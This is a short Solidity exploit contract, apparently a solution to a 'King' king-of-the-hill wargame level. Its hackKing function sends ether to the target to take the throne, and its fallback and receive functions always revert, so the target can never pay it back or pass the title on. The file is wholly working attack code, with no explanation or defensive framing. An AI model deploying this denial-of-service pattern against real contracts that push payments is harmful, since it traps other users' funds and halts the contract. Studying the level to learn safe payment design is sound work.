// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {King} from "./King.sol";

contract Pawn {
    address public king;

    constructor(address _king) payable {
        king = _king;
    }

    function hackKing() external payable {
        (bool success,) = payable(king).call{value: msg.value, gas: 800000}("");
        require(success, "Failed to hack King");
    }

    fallback() external payable {
        revert();
    }

    receive() external payable {
        revert();
    }
}
